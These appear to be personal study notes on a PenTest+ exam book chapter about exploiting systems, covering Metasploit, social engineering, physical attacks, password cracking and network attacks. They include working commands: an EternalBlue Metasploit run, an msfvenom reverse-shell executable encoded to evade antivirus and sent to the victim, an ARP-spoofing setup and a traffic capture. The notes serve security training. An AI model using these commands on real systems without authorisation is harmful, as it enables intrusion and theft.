# CompTIA® PenTest+® Certification For Dummies®, 2nd Edition
# Chapter 5: Exploiting Systems

Common Types of Exploits to gain access to systems
- Server Message Block (SMB), Pass the Hash, Password Cracking, Social Engineering, Man in the Middle (MiTM), Attacks on Physical Security.

## Exploiting System with Metasploit

A list of vuln that can be exploited to gain access to those systems after the vuln scan.
- Metasploit = Most popular exploit tool.


## Metasploit

Kali Linux: `msfconsole`  command.
- type `?` to bring up the help screen

Metasploit Exploit Rankings
- Rank indicates the usual success rate of the exploit.
- Good, Great, or Excellent is a good ranking.

![image](https://github.com/user-attachments/assets/dfdf5bb5-03d9-492f-9d75-5516bf581c35)


Each exploit = separate module in Metasploit.
- `Search` command to search for your exploit; `> search EternalBlue`.
- `Use` command to use the exploit; `> use exploit/windows/smb/ms_17_010_eternalblue`.
- `show options` command to see what options need to be filled. `> show options`.
  - RHOST = remote host

![image](https://github.com/user-attachments/assets/ddecb943-e3bc-4fa7-946f-9f325f832e9d)

- `set` command to set the option name for the required option; `> set RHOST 192.168.67.135`.

![image](https://github.com/user-attachments/assets/05ec6cc9-8253-4ba9-86e6-7c5006b46a9f)

- `exploit` command to run the exploit; `> exploit`.


WIN text after running the exploit = Windows command prompt of the target system, that you have admin capabilities of the target.

![image](https://github.com/user-attachments/assets/2b2bee4c-7cc5-4b83-b84d-d51826304ea5)

You will gain Windows\system32 shell access to the system. `CTRL + C` to exit.

![image](https://github.com/user-attachments/assets/28fe4432-f0bb-474e-99ee-53a84c47964d)

#

## Setting the Payload

Execute the Payload when you gain access to the system by exploiting the vuln.


Types of payload:
- Bind Shell, Reverse Bind Shell, Meterpreter Shell

![image](https://github.com/user-attachments/assets/63da9de5-fee9-4132-9d57-67884d93e976)


Select a payload with `set payload` command.

![image](https://github.com/user-attachments/assets/51f76304-249a-4cc2-8b1a-93576f360bec)

It's a good idea to use `show options` command to see if there are any payload options that needs to be set after changing the payload.

#

## Msfvenom

Msfvenom = payload generator that generate and output shell codes on Metasploit.
- Reverse Shell: enable you to obtain meterpreter session with target.
- Meterpreter session: Can download files from victim's PC, obtain password hashes, use webcam, and run many other post exploitation commands.

## Steps used to exploit system with malicous code generated with Msfvenom

1. Run `ifconfig` and record your own IP address.

2. Obtain meterpreter session using reverse TCP shell:

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_of_Kali> LPORT=4444 -a x86 --platform win -e x86/shikata_ga_nai -f exe -i 15 > /root/Desktop/ClarkeMalware.exe`

- -p: specifies the payload you wish to use.
- LHOST: specifies the IP address with which to obtain a reverse connection. This will be the IP address of the Kali system that will run a listener waiting for the program to connect.
- LPORT: specifies the port to connect to on the Kali system.
- -a x86: specifies the architecture of x86 for the created code.
- --platform win: specifies the code generated is for a Windows system.
- -e: specifies the encoder to use.
- -f exe: specifies the format of the generated code is to be an .exe file.
- -i 15: specifies to encode the program 15 times as an attempt to hide the malicious code from antivirus software.
-  `>`: specifies the filename to generate.
    

3. Setup a listener on your system by running:

`msfconsole`
`use exploit/multi/handler`
`set payload windows/meterpreter/reverse_tcp`
`set LHOST <ip_of_Kali>`
`exploit`

![image](https://github.com/user-attachments/assets/2b4f303a-240c-405d-b817-bd159c0d3f8d)


4. Copy or email malware to target machine:

When the user runs the program, the user’s system will connect to your Kali Linux system (the pentester system). Once connected, you will have a meterpreter shell to do as you please with the user’s system.

#

## Common Websites to Locate Exploit Against Different Products:

- Exploit-DB exploit database (DB): Source of info on exploits against vulnerable software. `www.exploit-db.com`
- Packet Storm: Listing of exploits against different software. `packetstormsecurity.com`

#

## Social Engineering

Phishing

- Spear phishing: Refers to a phishing attack that targets a specific person.
- SMS phishing: Short message service (SMS) phishing, also known as smishing, is a phishing attack conducted through text messaging instead of email.
- Vishing: Phishing attacks that use voice over the phone instead of email.
- Whaling: Refers to a phishing attack that targets the “big fish” of a company, such as the CEO.

Interrogation: asking people question, number of physical reactions to the question can be used to identify area that should be more questioning.

Watering Hole Attack: When hacker compromises a popular website then places code on site that will execute in browser of anyone who visits the site. The code then compromises the visitor's PC giving hacker access to visitor.

Methods of influence - Social proof: The hacker or pentester relies on the concept that if users see others doing something, they feel it is the correct thing to do, so they do it too.
- For example, if everyone is downloading a certain program, a user may feel that it must be safe if everyone else is doing it.

Social Enginner Toolkit (SET): Allows you to perform number of social engineering exploits to gain access to victim's system or compromise victim's password.
- Trick users into visiting cloned site; User enter their logon credentials onto the cloned site for SET to capture.

Browser Exploitation Framework (BeFE): Exploitation tool that focuses on exploiting victim's web browser. Generate malicious code to embed into a web page.
- When user visit web page, code establishes a connection to user's system, giving hack control ofthat system using BeFE console.
- Post-Exploitation: User's webcam or recording user's keystrokes.

Call Spoofing: hacker performing social engineering attack over phone altered number on victim's caller ID.
- Avoid being blocked by victim's phone.
- VoIP/ SpoofCard can be used to Spoof calls.

Pretexting: Fake scenario or pretext attackers present to potential victims in order to complete the attack.
- Attacker may make a call or send email to potential victim to say that they are from fraud department at victim's bank and noticed suspicious activity related to victim's account.
  - Ask victim to click a lin to log into victim's bank account to verifythe transactions.
- Trick victims into compromising security or sensitive info.

#

## Looking at Attacks on Physical Security

- Piggybacking: Employee knowing and allowing someone to gain access to a restricted area
- Tailgating: Employee did not know someone was able to gain access after the employee unlocked the door.
- Mantrap: Area between two locked doors, second door does not unlock until first door locks. Ensure employees know who is with them at all time.
- Badge Cloning: Attacker get their hands on a badge, and clone it with a badge cloning device that copy the electronic data stored on the badge and gain access to the building.

Attacks on locks
- Bump key: lock picking tech where a filed down key is placed in the lock and then tapped (bumped) lightly while turning the key slightly. Many quality locks are bump proof.
- Lock Bypass: Loiding, credit card is used to bypass a self closing latch system.

#

## Common Attack Techniques

- Password cracking: gain access to system.
- Dictionary Attack: Password cracking program uses a dictionary or wordlist file that contains all of the words in a language dictionary.
- Credential Brute Forcing: Password carking program calculates every possible password based on the criteria you supply. Slower than Dictionary attack but more effective.
- Rainbow tables: Contains all of the passwords from a brute force attack that is pre calculated into a file. Get the effectiveness of brute force while getting the speed of a dictionary attack.
- Password Spraying: Attacker attempting to log on to many different account with the same password. Password that is well known or default password. (Find account that uses common password).
- Hash cracking: Password cracking tools involves grabbing the password hashes of user account and then crack the password hashes. John the Ripper is a password hash cracking tool.
- Cross Compiling Code: Downloading source code for an exploit, you can compile the code to the platform that works for you. If exploit is for Windows, compile it to Windows.
- Exploit Chaining: Concept that many attacks are combination of different exploits run one after another. First exploit the web server then exploit database server.

#

## Exploiting Network-Based Vulnerabilities

Common Tools used for network-based attacks:
- Metasploit: Framework contains number of exploits against different products.
- Netcat: Used to open a port on system to allow you to connect back to that system. Also be used to establish the connection to the open port.
- Nmap: Discover systems that are running services you wish to exploit.

Common Network based exploits:
- Name-resolution Exploits: Exploits against tech that resolves names to IP addresses
  - NetBIOS name services that converts computer names to IP addresses.
  - Link-local Multicast Name Resolution (LLMNR) protocol that converts hostnames to an IPv4 to IPv6 address.
- Link-Local Multicast Name Resolution (LLMNR)/NetBIOS Name Service (NBT-NS) poisoning: This exploit is a form of name-resolution attack where the victim broadcasts a message to the network looking for the IP address of a system that has a particular file share.
  - An attacker intercepts this call and then send the attacker’s server information so that the victim tries to connect to the attacker’s system.
  - During this process the attacker collects the credentials that were passed during the connection attempt. Responder is an example of a tool you can use to perform this type of attack.
- New Technology LAN Manager (NTLM) relay attacks: This exploit is an older attack type on the NTLM protocol where attackers inject themselves between a client and a server and are able to capture the password hashes. Once the password hashes are obtained, attackers can then try their favorite password crackers on the hashes.
- SMB exploits: Server Message Block (SMB) is the file-sharing protocol for Microsoft networks. In order to exploit a system with an SMB exploit, the system must be running SMB and be vulnerable to the exploit (not patched). The EternalBlue exploit used earlier in this chapter is an SMB exploit. SMB uses TCP port 139 (NetBIOS) and TCP port 445.
- SNMP exploits: The Simple Network Management Protocol (SNMP) is a protocol used to monitor and manage network devices. A system running SNMP may be vulnerable to SNMP exploits. SNMP uses UDP port 161.
- SMTP exploits: The Simple Mail Transfer Protocol (SMTP) is the Internet protocol for sending email. A system running an SMTP service, such as a web server or email server, may be vulnerable to an SMTP exploit. SMTP uses TCP port 25.
- FTP exploits: The File Transfer Protocol (FTP) is a service that allows the uploading and downloading of files from a machine running an FTP service. If the system is not patched, it may be vulnerable to an FTP exploit. FTP uses TCP port 20 and 21.

Tip to port scan with Nmap on the Common Network Based Exploits:
`nmap -sS 192.168.2.0/24 -p 139,445,25,21`: To locate systems running the services using TCP ports.
`nmap -sU 192.168.2.0/24 -p 137,138,161`: To locate the systems that run the services using UDP ports.

Man in the Middle (MiTN) Attacks
- Also On-Path Attacks, used to insert themselves into the communication path of their victim so that they can capture a copy of all communication sent from victim's system.
- Commonly wireless network in Internet cafe network; also for password attacks to try to capture passwords used on a network.

ARP Poisoning
- One type of On-path attack = ARP Poisoning also ARP spoofing
- Attacker poisons client's ARP cache with IP address of the default gateway (router) and associate the IP address with attacker's MAC address.
- Reason: Victim's system will now send all internet traffic to the attacker's system because the victim thinks the attacker is the router to get to the internet.
- Hacker will enable routing out to the Internet so victim will not suspect a thing.

ARP Poisoning Example:
- `arpspoof -i eth0 192.168.2.1`: send out ARP reply messages on the network that interface Eth0 is connected to an give attacker's MAC address for the IP address of 192.168.2.1 (default gateway) to all systems on the network to store in their ARP cache.
- `echo 1 > /proc/sys/net/ipv4/ip_forward`: Ensure that PenTest system has routing enabled using this command.


Capture, Replay, and replay: Use Wireshark or tcpdump after you have poisoned the ARP cache of the victim's system on the network.
- Tcpdump capture all web traffic: `tcpdump 80 -w webtraffic.pcap`
- Replay traffic is to submit it back on network after it has been captured in order to generate more network traffic.
- To replay traffic on network from packet capture file: `tcpreplay -i eth0 webtraffic.pcap`.
  - Can also use tcpreplay to manipulate what data is played from the capture file and speed at wich it is replayed.
- Relay traffic received: To forward any traffic that your system receives on to another system.
  - Allow MiTM attack and recieve all traffic while being unnoticed.
 
SSL stripping and downgrade: Both MiTM attacks
- SSL stripping: Attacker is performing a MiTM attack and the user is surfing a secure website (HTTPS), attacker is able to remove the encryption from communication.
  - Attack accomplish this by establishing a secure connection (HTTPS) with the site that victim is visiting but continues to use HTTP to commuciate with the victim.
  - Because attacker is the one visting the encrypted site, attacker has the key to decrypt the communication, while having unsecure communication with victim.
 - Downgrade Attack: Hacker forces the victim to use a lower version protocol that is considered unsecure and easily exploited.
  - Instead of using WPA2 wireless security, the attacker forces the user to use previous version of WPA that is easier to crack the encryption key.

 
Other Common Attacks:
- DNS cache poisoning: Attack system's Domain Name Resolution so that you can direct victims to whatever system you want when they access common DNS addresses.
  - 


#

## Exam Key

- Social Engineering goal = elicitation (method of communication used to get information from someone without making them aware that they are being targeted), causing victom to compromise security.
- Business Email Compromise (BEC) attack = gain access to employee's corporate email account and use it to send messages to other employees in the company.
- Know the difference between piggybacking and tailgating.
- ARP poisoning, also known as ARP spoofing, the attacker will typically spoof the address of the default gateway or router.

#

## Prep Test

1. B
2. D
3. C
4. A x
5. B
6. D x
7. B
8. D
9. A x
10. A
